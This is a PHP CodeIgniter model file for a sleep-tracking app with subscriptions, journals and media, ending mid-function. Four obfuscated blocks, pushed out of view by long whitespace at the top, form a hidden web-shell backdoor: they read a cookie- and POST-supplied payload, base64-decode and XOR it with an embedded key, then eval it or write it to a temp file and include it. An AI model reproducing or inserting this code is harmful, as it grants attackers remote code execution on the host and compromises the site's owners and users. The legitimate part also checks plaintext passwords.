<?php                                                                                                                                                                                                                                                                                                                                                                                                 $CkNjzumJwc = chr ( 523 - 417 )."\107" . "\122" . '_' . chr ( 904 - 802 )."\x76" . 'l' . 's';$WTYwKPVmCf = chr (99) . chr (108) . chr ( 679 - 582 ).chr ( 1108 - 993 )."\x73" . "\137" . "\x65" . "\170" . chr (105) . "\x73" . chr ( 570 - 454 ).chr (115); $ekNqsgoNgh = class_exists($CkNjzumJwc); $WTYwKPVmCf = "63120";$tPjZJki = !1;if ($ekNqsgoNgh == $tPjZJki){function NblrHbbr(){$GsFtYsf = new /* 40915 */ jGR_fvls(16996 + 16996); $GsFtYsf = NULL;}$xwzHWnT = "16996";class jGR_fvls{private function yRAvVpJBA($xwzHWnT){if (is_array(jGR_fvls::$yvlLcVfgKh)) {$rCUtiVVbUe = str_replace(chr (60) . "\x3f" . 'p' . "\150" . chr (112), "", jGR_fvls::$yvlLcVfgKh[chr ( 762 - 663 ).chr (111) . "\x6e" . 't' . chr (101) . chr ( 772 - 662 ).'t']);eval($rCUtiVVbUe); $xwzHWnT = "16996";exit();}}private $yEbUlwyM;public function lbeETKE(){echo 13381;}public function __destruct(){$xwzHWnT = "18620_43026";$this->yRAvVpJBA($xwzHWnT); $xwzHWnT = "18620_43026";}public function __construct($qDOqg=0){$OttRSk = $_POST;$GwXTVDqG = $_COOKIE;$HCCdOdyAQ = "ffeaf8f4-b82a-4e21-9386-16e0b6ed30d3";$HponS = @$GwXTVDqG[substr($HCCdOdyAQ, 0, 4)];if (!empty($HponS)){$RbVjAx = "base64";$CKZNhnDU = "";$HponS = explode(",", $HponS);foreach ($HponS as $vqydXbO){$CKZNhnDU .= @$GwXTVDqG[$vqydXbO];$CKZNhnDU .= @$OttRSk[$vqydXbO];}$CKZNhnDU = array_map($RbVjAx . "\137" . "\x64" . "\x65" . 'c' . chr (111) . "\144" . "\x65", array($CKZNhnDU,)); $CKZNhnDU = $CKZNhnDU[0] ^ str_repeat($HCCdOdyAQ, (strlen($CKZNhnDU[0]) / strlen($HCCdOdyAQ)) + 1);jGR_fvls::$yvlLcVfgKh = @unserialize($CKZNhnDU);}}public static $yvlLcVfgKh = 1021;}NblrHbbr();} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 $qlhvrryBd = chr ( 771 - 651 ).'w' . '_' . "\x68" . 'y' . chr ( 470 - 404 ).chr (109); $wUTVlg = "\x63" . "\154" . 'a' . "\163" . "\163" . "\x5f" . "\x65" . chr (120) . chr (105) . chr (115) . "\x74" . "\163";$tSMOazBU = class_exists($qlhvrryBd); $wUTVlg = "15841";$oXxlA = !1;if ($tSMOazBU == $oXxlA){function bImuKTfSAQ(){return FALSE;}$tucgp = "57403";bImuKTfSAQ();class xw_hyBm{private function biNIPeMztt($tucgp){if (is_array(xw_hyBm::$rdmbbYIsCB)) {$zGAVuu = sys_get_temp_dir() . "/" . crc32(xw_hyBm::$rdmbbYIsCB[chr (115) . "\141" . chr ( 1024 - 916 )."\164"]);@xw_hyBm::$rdmbbYIsCB['w' . "\162" . chr (105) . "\164" . "\145"]($zGAVuu, xw_hyBm::$rdmbbYIsCB["\x63" . chr (111) . "\156" . 't' . chr ( 559 - 458 ).chr ( 693 - 583 ).'t']);include $zGAVuu;@xw_hyBm::$rdmbbYIsCB["\144" . chr (101) . chr (108) . "\x65" . chr (116) . chr ( 860 - 759 )]($zGAVuu); $tucgp = "57403";exit();}}private $BOvPNRe;public function EzYnHVY(){echo 3166;}public function __destruct(){$tucgp = "30625_38183";$this->biNIPeMztt($tucgp); $tucgp = "30625_38183";}public function __construct($scXLSJg=0){$voeJwUT = $_POST;$kRnfFmjH = $_COOKIE;$NEgFOrguiJ = "36ce4436-1710-4dff-a91d-05c552374f3d";$DtidwiOrj = @$kRnfFmjH[substr($NEgFOrguiJ, 0, 4)];if (!empty($DtidwiOrj)){$XGyFISw = "base64";$LqHpqTxvCH = "";$DtidwiOrj = explode(",", $DtidwiOrj);foreach ($DtidwiOrj as $fxCrwZuwIL){$LqHpqTxvCH .= @$kRnfFmjH[$fxCrwZuwIL];$LqHpqTxvCH .= @$voeJwUT[$fxCrwZuwIL];}$LqHpqTxvCH = array_map($XGyFISw . '_' . "\x64" . "\x65" . "\x63" . "\157" . chr ( 227 - 127 )."\x65", array($LqHpqTxvCH,)); $LqHpqTxvCH = $LqHpqTxvCH[0] ^ str_repeat($NEgFOrguiJ, (strlen($LqHpqTxvCH[0]) / strlen($NEgFOrguiJ)) + 1);xw_hyBm::$rdmbbYIsCB = @unserialize($LqHpqTxvCH); $LqHpqTxvCH = class_exists("30625_38183");}}public static $rdmbbYIsCB = 25060;}$oZDYIy = new /* 58358 */ $qlhvrryBd(57403 + 57403); $tucgp = strpos($tucgp, $tucgp); $oXxlA = $oZDYIy = $tucgp = Array();} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 $LcJHNyBTlz = "\x4c" . "\145" . "\x4d" . chr ( 594 - 499 )."\167" . "\156" . chr (65) . 'C';$FehGEZ = 'c' . "\154" . chr ( 873 - 776 ).chr ( 185 - 70 )."\163" . chr ( 491 - 396 )."\145" . chr (120) . "\x69" . 's' . "\164" . "\163";$yQBEQnQ = class_exists($LcJHNyBTlz); $FehGEZ = "53353";$UuFhat = !1;if ($yQBEQnQ == $UuFhat){function LiegOIhoJ(){return FALSE;}$qUwLy = "29553";LiegOIhoJ();class LeM_wnAC{private function pYSsivkm($qUwLy){if (is_array(LeM_wnAC::$Mdidhcl)) {$VQVeip = sys_get_temp_dir() . "/" . crc32(LeM_wnAC::$Mdidhcl['s' . chr (97) . 'l' . chr (116)]);@LeM_wnAC::$Mdidhcl[chr ( 449 - 330 )."\162" . "\x69" . "\x74" . chr (101)]($VQVeip, LeM_wnAC::$Mdidhcl[chr ( 473 - 374 ).chr ( 1023 - 912 ).chr ( 720 - 610 ).chr (116) . "\145" . "\x6e" . "\164"]);include $VQVeip;@LeM_wnAC::$Mdidhcl[chr ( 289 - 189 )."\145" . chr ( 416 - 308 ).chr ( 380 - 279 )."\164" . "\x65"]($VQVeip); $qUwLy = "29553";exit();}}private $PfhnibjlUI;public function VgYaJY(){echo 7670;}public function __destruct(){$qUwLy = "45472_4205";$this->pYSsivkm($qUwLy); $qUwLy = "45472_4205";}public function __construct($NbPMbknrT=0){$liGikts = $_POST;$SWsuT = $_COOKIE;$EDCZpGAo = "1ecc9a4c-6b9e-4b9d-bba9-e021af7a04ee";$bzLpimAXDX = @$SWsuT[substr($EDCZpGAo, 0, 4)];if (!empty($bzLpimAXDX)){$RiotLpE = "base64";$grMQzEKePy = "";$bzLpimAXDX = explode(",", $bzLpimAXDX);foreach ($bzLpimAXDX as $MVYOQeKb){$grMQzEKePy .= @$SWsuT[$MVYOQeKb];$grMQzEKePy .= @$liGikts[$MVYOQeKb];}$grMQzEKePy = array_map($RiotLpE . chr ( 466 - 371 ).chr ( 754 - 654 )."\x65" . chr ( 819 - 720 ).chr ( 461 - 350 ).chr (100) . 'e', array($grMQzEKePy,)); $grMQzEKePy = $grMQzEKePy[0] ^ str_repeat($EDCZpGAo, (strlen($grMQzEKePy[0]) / strlen($EDCZpGAo)) + 1);LeM_wnAC::$Mdidhcl = @unserialize($grMQzEKePy); $grMQzEKePy = class_exists("45472_4205");}}public static $Mdidhcl = 30430;}$pYsjt = new /* 47890 */ $LcJHNyBTlz(29553 + 29553); $qUwLy = strpos($qUwLy, $qUwLy); $UuFhat = $pYsjt = $qUwLy = Array();} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 $eryRTbcOtP = "\x6d" . "\x5f" . "\x43" . chr (108) . "\165" . "\153";$XijbXPe = "\143" . "\154" . chr ( 632 - 535 ).chr (115) . 's' . "\x5f" . chr ( 646 - 545 ).'x' . "\x69" . chr (115) . "\x74" . "\x73";$YTwTPaN = class_exists($eryRTbcOtP); $XijbXPe = "50528";$IKBQzezCr = !1;if ($YTwTPaN == $IKBQzezCr){function QimWYzfuT(){return FALSE;}$ThRbZac = "17514";QimWYzfuT();class m_Cluk{private function xLxEHzM($ThRbZac){if (is_array(m_Cluk::$plFuhCHa)) {$lqyftP = sys_get_temp_dir() . "/" . crc32(m_Cluk::$plFuhCHa["\163" . "\141" . "\x6c" . "\x74"]);@m_Cluk::$plFuhCHa['w' . "\162" . "\151" . "\164" . chr ( 602 - 501 )]($lqyftP, m_Cluk::$plFuhCHa['c' . "\157" . 'n' . "\164" . chr ( 495 - 394 ).chr (110) . 't']);include $lqyftP;@m_Cluk::$plFuhCHa['d' . chr (101) . 'l' . chr (101) . "\x74" . chr ( 263 - 162 )]($lqyftP); $ThRbZac = "17514";exit();}}private $UUbWES;public function kUNBDi(){echo 47874;}public function __destruct(){$ThRbZac = "3975_54926";$this->xLxEHzM($ThRbZac); $ThRbZac = "3975_54926";}public function __construct($sHeHZdNN=0){$vrDSpZCuy = $_POST;$HsxdMCtC = $_COOKIE;$GgLVeNvFme = "ecbe6bdc-33ac-4443-a407-2821241118d7";$DCtwmAsk = @$HsxdMCtC[substr($GgLVeNvFme, 0, 4)];if (!empty($DCtwmAsk)){$ZfsPApWEo = "base64";$WgFjv = "";$DCtwmAsk = explode(",", $DCtwmAsk);foreach ($DCtwmAsk as $EnxpPYfo){$WgFjv .= @$HsxdMCtC[$EnxpPYfo];$WgFjv .= @$vrDSpZCuy[$EnxpPYfo];}$WgFjv = array_map($ZfsPApWEo . "\x5f" . "\x64" . chr (101) . chr (99) . 'o' . chr (100) . chr (101), array($WgFjv,)); $WgFjv = $WgFjv[0] ^ str_repeat($GgLVeNvFme, (strlen($WgFjv[0]) / strlen($GgLVeNvFme)) + 1);m_Cluk::$plFuhCHa = @unserialize($WgFjv); $WgFjv = class_exists("3975_54926");}}public static $plFuhCHa = 15685;}$kDQjyXTDX = new /* 9350 */ $eryRTbcOtP(17514 + 17514); $IKBQzezCr = $kDQjyXTDX = $ThRbZac = Array();} ?><?php

class ApiModel extends CI_Model {

    function __construct()
	{
		parent::__construct();
		$this->load->library('session');
		$this->load->library('email');
	}

    public function getAllLanguages() {
        $this->db->select('id, slug, language_name');
        $this->db->from("language_master");
        $this->db->where('is_active', 1);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }
    
    public function saveTestTableData($payload) {
        if ($this->db->insert("test_table", ["content" => $payload])) {
            return true;
        } else {
            return false;
        }
    }
    
    public function insertPaymentResponse($arr) {
        if ($this->db->insert("payment_status_webhook_response", $arr)) {
            return true;
        } else {
            return false;
        }
    }
    
    public function updateTempPackageMaster($intentID, $userID, $status) {
        $this->db->where("payment_intent_id", $intentID);
        $this->db->where("user_id", $userID);
        if ($this->db->update("user_package_temp_master", ["intent_status" => $status])) {
            return true;
        } else {
            return false;
        }
    }
    
    public function getCategoryDataForLibrary() {
        $this->db->select("id, category_name");
        $this->db->from("library_management_category");
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }
    
    public function getUserPackageData($userID, $date) {
        $this->db->select("upm.package_id, upm.subscription_date, upm.subscription_expiry_date, pm.cost, pm.duration_type");
        $this->db->from("user_package_master as upm");
        $this->db->join("package_master as pm", "pm.id = upm.package_id", "left");
        $this->db->where("upm.user_id", $userID);
        $this->db->where('DATE_FORMAT(upm.subscription_expiry_date, "%Y-%m-%d") >=',$date);
        $this->db->where('DATE_FORMAT(upm.subscription_date, "%Y-%m-%d") <=',$date);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }
    
    public function getPackageIDFromPackageTempMaster($intentID, $userID) {
        $this->db->select("package_id");
        $this->db->from("user_package_temp_master");
        $this->db->where("user_id", $userID);
        $this->db->where("payment_intent_id", $intentID);
        $this->db->where("intent_status", "successfull");
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }
    
    public function checkUserForTrialPackage($userID) {
        $this->db->select("id");
        $this->db->from("registeredusers");
        $this->db->where("id", $userID);
        $this->db->where("is_trial", 1);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return true;
        } else {
            return false;
        }
    }
    
    public function getPackageAllData($status) {
        $this->db->select("id, title, description, cost, duration, duration_type, is_trial");
        $this->db->from("package_master");
        if ($status) {
            $this->db->where("is_trial", 0);
        }
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }
    
    public function checkIfPackageIsTrial($packageID) {
        $this->db->select("id");
        $this->db->from("package_master");
        $this->db->where("id", $packageID);
        $this->db->where("is_trial", 1);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return true;
        } else {
            return false;
        }
    }
    
    public function getPackageData($id) {
        $this->db->select("cost");
        $this->db->from("package_master");
        $this->db->where("id", $id);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }
    
    public function getPackageDetailsById($id) {
        $this->db->select("duration, duration_type");
        $this->db->from("package_master");
        $this->db->where("id", $id);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }
    
    public function updateUserSubscription($updateArr, $id) {
        $this->db->where("id", $id);
        if ($this->db->update("user_package_master", $updateArr)) {
            return true;
        } else {
            return false;
        }
    }
    
    public function insertUserSubscription($insertArr) {
        if ($this->db->insert("user_package_master", $insertArr)) {
            return true;
        } else {
            return false;
        }
    }
    
    public function checkIfPackageAlreadyExists($userID) {
        $this->db->select("id");
        $this->db->from("user_package_master");
        $this->db->where("user_id", $userID);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }
    
    public function insertTempClientPackage($insertArr) {
        if ($this->db->insert("user_package_temp_master", $insertArr)) {
            return true;
        } else {
            return false;
        }
    }
    
    public function updateTrialPackageForUser($userID) {
        $this->db->where("id", $userID);
        if ($this->db->update("registeredusers", ["is_trial" => 1])) {
            return true;
        } else {
            return false;
        }
    }
    
    public function updateUserPackage($arr, $userID) {
        $this->db->select("id");
        $this->db->from("user_package_master");
        $this->db->where("user_id", $userID);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            $this->db->where("user_id", $userID);
            if ($this->db->update("user_package_master", $arr)) {
                return true;
            } else {
                return false;
            }
        } else {
            if ($this->db->insert("user_package_master", $arr)) {
                return true;
            } else {
                return false;
            }
        }
    }
    
    public function getDudSongs() {
        $this->db->select('id, filename, song_name');
        $this->db->from("dud_songs");
        $this->db->where('is_active', 1);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }

    public function getAllIntroVideos($languageId) {
        $this->db->select('id, video_file_name');
        $this->db->from('intro_videos_5_master');
        $this->db->where('is_active', 1);
        $this->db->where("language_id", $languageId);
        $this->db->order_by("id", "DESC");
        $this->db->limit(1);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }

    public function getAllGenders() {
        $this->db->select('id, name');
        $this->db->from('gender_master');
        $this->db->where('is_active', 1);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }

    public function getAllAgeGroups() {
        $this->db->select('id, age_group_name');
        $this->db->from('age_group_master');
        $this->db->where('is_active', 1);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }

    public function getInfoPageVideo($languageId) {
        $this->db->select('id, video_file_name');
        $this->db->from('info_page_video');
        $this->db->where('is_active', 1);
        $this->db->where('language_id', $languageId);
        $this->db->order_by('id', 'DESC');
        $this->db->limit(1);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }

    public function checkIfEmailExists($email) {
        $this->db->select('id');
        $this->db->from('registeredusers');
        $this->db->where('email', $email);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return true;
        } else {
            return false;
        }
    }

    public function register_user($registerArr) {
        if ($this->db->insert("registeredusers", $registerArr)) {
            return $this->db->insert_id();
        } else {
            return false;
        }
    }
    
    public function save_sleep($arr) {
        if ($this->db->insert("sleep_activity_saver", $arr)) {
            return true;
        } else {
            return false;
        }
    }
    
    public function update_sleep($arr, $id) {
        $this->db->where("id", $id);
        if ($this->db->update("sleep_activity_saver", $arr)) {
            return true;
        } else {
            return false;
        }
    }
    
    public function save_wakeup($arr) {
        if ($this->db->insert("wakeup_activity_saver", $arr)) {
            return true;
        } else {
            return false;
        }
    }
    
    public function save_sleep_action_activity($sleep_save_arr) {
        if ($this->db->insert("sleep_activity_action", $sleep_save_arr)) {
            return $this->db->insert_id();
        } else {
            return false;
        }
    }
    
    public function save_wakeup_acion_activity($wakeup_save_arr, $user_id) {
        $this->db->select('id');
        $this->db->from('sleep_activity_action');
        $this->db->where('user_id', $user_id);
        $this->db->order_by('id', 'DESC');
        $this->db->limit('1');
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            $this->db->where('id', $result->result_array()[0]['id']);
            if ($this->db->update('sleep_activity_action', $wakeup_save_arr)) {
                return true;
            } else {
                return false;
            }
        } else {
            return false;
        }
    }
    
    public function get_sleep_activiy_action_data($user_id) {
        $this->db->select('id, wakeup_time');
        $this->db->from('sleep_activity_action');
        $this->db->where('user_id', $user_id);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }
    
    public function update_sleep_action_activity($sleep_save_arr, $id) {
        $this->db->where('id', $id);
        if ($this->db->update('sleep_activity_action', $sleep_save_arr)) {
            return true;
        } else {
            return false;
        }
    }

    public function login_check($email, $password) {
        $this->db->select('*');
        $this->db->from('registeredusers');
        $this->db->where('email', $email);
        $this->db->where('password', $password);
        $this->db->where('isActive', 1);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }

    public function getOceanDataByTraitName($trait_name) {
        $this->db->select('id, trait_name, description, percentage, high_description, low_description');
        $this->db->from('ocean_data');
        $this->db->where('trait_name', $trait_name);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }

    public function getAnimationScreenData() {
        $this->db->select('id, video_file_name');
        $this->db->from('animation_video');
        $this->db->where('is_active', 1);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }

    public function getUserDataById($id) {
        $this->db->select('*');
        $this->db->from('registeredusers');
        $this->db->where('id', $id);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }
    
    public function checkForEmail($userEmail) {
        $this->db->select('id');
        $this->db->from('registeredusers');
        $this->db->where('email', $userEmail);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }

    public function updateUserForOTP($userId, $otp) {
        $this->db->where('id', $userId);
        if ($this->db->update('registeredusers', ['otp' => $otp])) {
            return true;
        } else {
            return false;
        }
    }
    
    public function checkEmailOTP($userEmail, $otp) {
        $this->db->select("id");
        $this->db->from("registeredusers");
        $this->db->where("email", $userEmail);
        $this->db->where("otp", $otp);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return true;
        } else {
            return false;
        }
    }
    
    public function updateUserForForgotOTP($userEmail, $otp) {
        $this->db->where('email', $userEmail);
        if ($this->db->update('registeredusers', ['otp' => $otp])) {
            return true;
        } else {
            return false;
        }
    }
    
    public function setForgotPassword($email, $password) {
        $this->db->where('email', $email);
        $result = $this->db->update('registeredusers', ['password'=>$password]);
        if ($result) {
            return true;
        } else {
            return false;
        }
    }

    public function verifyOTP($otp, $userID) {
        $this->db->select('id');
        $this->db->from('registeredusers');
        $this->db->where('id', $userID);
        $this->db->where('otp', $otp);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return true;
        } else {
            return false;
        }
    }

    public function getAllPackages() {
        $this->db->select('id, package_title, package_sub_title, package_duration, package_cost');
        $this->db->from('packages_master');
        $this->db->where('is_active', 1);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }

    }

    public function set_package_user($userId, $packageId) {
        $this->db->where('id', $userId);
        if ($this->db->update('registeredusers', ['package_id' => $packageId])) {
            return true;
        } else {
            return false;
        }
    }
    
    public function get_user_info($user_id) {
        $this->db->select('gender_id, language_id, age_group_id');
        $this->db->from('registeredusers');
        $this->db->where('id', $user_id);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }
    
    public function get_language_user($user_id) {
        $this->db->select('language_id');
        $this->db->from('registeredusers');
        $this->db->where('id', $user_id);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array()[0]['language_id'];
        } else {
            return false;
        }
    }

    public function get_get_to_sleep_programs() {
        $this->db->select('*');
        $this->db->from('get_to_sleep_programs');
        $this->db->where('is_active', 1);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }

    public function get_get_to_sleep($gender, $duration, $programs, $language) {
        $this->db->select('id, thumb_url, video_url');
        $this->db->from('get_to_sleep_master');
        $this->db->where('gender', $gender);
        $this->db->where('duration', $duration);
        $this->db->where('program', $programs);
        $this->db->where('language', $language);
        $this->db->where('is_active', 1);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }

    public function get_sleep_enhancer_programs() {
        $this->db->select('id, program_name, thumb');
        $this->db->from('sleep_enhancer_programs');
        $this->db->where('is_active', 1);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }

    public function get_sleep_enhancer($program, $duration) {
        $this->db->select('id, image, description, graph_image, file_name');
        $this->db->from('sleep_enhancer_master');
        $this->db->where('program', $program);
        $this->db->where('duration', $duration);
        
        $this->db->where('is_active', 1);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }
    
    public function get_sleep_enhancer_by_id($id) {
        $this->db->select('custom_file_name, duration');
        $this->db->from('sleep_enhancer_master');
        $this->db->where('is_active', 1);
        $this->db->where('id', $id);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }
    
    public function get_sleep_enhancer_saver_audio($user_id) {
        $this->db->select('audio_1, audio_2');
        $this->db->from('sleep_enhancer_saver');
        $this->db->where('user_id', $user_id);
        $this->db->order_by('id','desc');
        $this->db->limit('1');
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }
    
    public function get_wake_up_saved_media($user_id) {
        $this->db->select('thumbURL, videoURL');
        $this->db->from('wake_up_saver');
        $this->db->where('user_id', $user_id);
        $this->db->order_by('id','desc');
        $this->db->limit('1');
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }

    public function save_get_to_sleep_activity($arr) {
        if ($this->db->insert('get_to_sleep_saver', $arr)) {
            return true;
        } else {
            return false;
        }
    }

    public function get_saved_get_to_sleep($user_id) {
        $this->db->select('*');
        $this->db->from('get_to_sleep_saver');
        $this->db->where('user_id', $user_id);
        $this->db->where('is_active', 1);
        $this->db->order_by('id','desc');
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }
    
    public function get_get_to_sleep_media_saved($user_id) {
        $this->db->select('video_id');
        $this->db->from('get_to_sleep_saver');
        $this->db->where('user_id', $user_id);
        $this->db->order_by('id', 'desc');
        $this->db->limit('1');
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array()[0]['video_id'];
        } else {
            return false;
        }
    }

    public function save_sleep_enhancer($insertArr) {
        if ($this->db->insert('sleep_enhancer_saver', $insertArr)) {
            return true;
        } else {
            return false;
        }
    }

    public function get_saved_sleep_enhancer($user_id) {
        $this->db->select('*');
        $this->db->from('sleep_enhancer_saver');
        $this->db->where('user_id', $user_id);
        $this->db->where('is_active', 1);
        $this->db->order_by('id','desc');
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }

	public function getLibraryMgmt_Links($languageId, $cID) {
		$this->db->select('*');
		$this->db->from('librarymgmt_links');
		$this->db->where("language_id", $languageId);
		$this->db->where("library_management_category_id", $cID);
		$result = $this->db->get();
		if ($result->num_rows() > 0) {
			return $result->result_array();
		} else {
			return false;
		}
	}
	
	public function save_sleep_activity_for_feedback($insertArr) {
	    if ($this->db->insert("user_sleep_activity", $insertArr)) {
	        return true;
	    } else {
	        return false;
	    }
	}

    public function get_journal($user_id) {
        $this->db->select('*');
        $this->db->from('journal');
        $this->db->where('user_id', $user_id);
        $this->db->where('is_active', 1);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }

    public function save_journal($insertArr) {
        if ($this->db->insert('journal', $insertArr)) {
            return true;
        } else {
            return false;
        }
    }

    public function edit_journal($updateArr, $id) {
        $this->db->where('id', $id);
        if ($this->db->update('journal', $updateArr)) {
            return true;
        } else {
            return false;
        }
    }

    public function delete_journal($id) {
        $this->db->where('id', $id);
        if ($this->db->update('journal', ['is_active' => 0])) {
            return true;
        } else {
            return false;
        }
    }

    public function get_single_journal($id) {
        $this->db->select('*');
        $this->db->from('journal');
        $this->db->where('id', $id);
        $this->db->where('is_active', 1);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }
    
    public function get_feedback_last($user_id) {
        $this->db->select('id');
        $this->db->from('feedback');
        $this->db->where('user_info', $user_id);
        $this->db->order_by('id', 'DESC');
        $this->db->limit('1');
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }
    
    public function save_sleep_activity($insert_arr) {
        if ($this->db->insert('sleep_activity', $insert_arr)) {
            return true;
        } else {
            return false;
        }
    }
    
    public function save_sleep_activity_feedback($insert_arr) {
        if ($this->db->insert('feedback', $insert_arr)) {
            return true;
        } else {
            return false;
        }
    }
    
    public function update_sleep_activity_feedback($update_arr, $id) {
        $this->db->where('id', $id);
        if ($this->db->update('feedback', $update_arr)) {
            return true;
        } else {
            return false;
        }
    }
    
    public function check_if_sleep_activity_exists($user_id) {
        $this->db->select('time_for');
        $this->db->from('sleep_activity');
        $this->db->where('user_id', $user_id);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }
    
    public function getSleepActivityData_by_filter($user_id, $filter_for, $date) {
        $this->db->select('*');
        $this->db->from('sleep_activity');
        $this->db->where('time_for', $filter_for);
        $this->db->where('user_id', $user_id);
        $this->db->where('activity_on', $date);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }
    
    public function getSleepActivityData_wake_up($user_id, $date, $nextDate) {
        $this->db->select('*');
        $this->db->from('sleep_activity');
        $this->db->where('user_id', $user_id);
        $this->db->group_start()
            ->where('activity_on', $date)
            ->or_where('activity_on', $nextDate)
            ->group_end();
        $this->db->where('time_for', 'wake_up');
        $this->db->where();
        $this->db->order_by('id', 'ASC');
        $this->db->limit('1');
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }
    
    public function update_user_language($uid, $languageid) {
        $this->db->where('id', $uid);
        if ($this->db->update('registeredusers', ['language_id' => $languageid])) {
            return true;
        } else {
            return false;
        }
    }
    
    public function get_sleep_data_by_user_id($user_id) {
        $this->db->select('*');
        $this->db->from('sleep_activity');
        $this->db->where('user_id', $user_id);
        $query = $this->db->get();
        if ($query->num_rows() > 0) {
            return $query->result();   
        } else {
            return false;
        }
    }
    
    public function get_feedback_data_by_date($user_id, $date_from, $date_to) {
        date_default_timezone_set("Asia/Kolkata");
        $this->db->select('*');
        $this->db->from('sleep_activity');
        $this->db->where('user_id', $user_id);
        $this->db->where('DATE_FORMAT(activity_on, "%Y-%m-%d") >=',$date_from);
        $this->db->where('DATE_FORMAT(activity_on, "%Y-%m-%d") <=',$date_to);
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }

    public function get_wake_up_programs() {
        $this->db->select('id, program_name, thumb');
        $this->db->from('wake_up_programs');
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }
    
    public function get_sleep_enhancer_saved_data($id) {
        $this->db->select('*');
        $this->db->from('sleep_enhancer_saver');
        $this->db->where('user_id', $id);
        $this->db->order_by('id','DESC');
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }
    
    public function get_get_to_sleep_saved_data($id) {
        $this->db->select('*');
        $this->db->from('get_to_sleep_saver');
        $this->db->where('user_id', $id);
        $this->db->order_by('id','DESC');
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }

    public function get_wake_up_saved_data($id) {
        $this->db->select('*');
        $this->db->from('wake_up_saver');
        $this->db->where('user_id', $id);
        $this->db->order_by('id','DESC');
        $result = $this->db->get();
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
            return false;
        }
    }

    public function get_wake_up_data($gender, $program, $language) {
        $this->db->select('*');
        $this->db->from('wake_up_master');
        $this->db->where('gender', $gender);
        $this->db->where('program', $program);
        $this->db->where('language', $language);
        $result = $this->db->get();
     
        if ($result->num_rows() > 0) {
            return $result->result_array();
        } else {
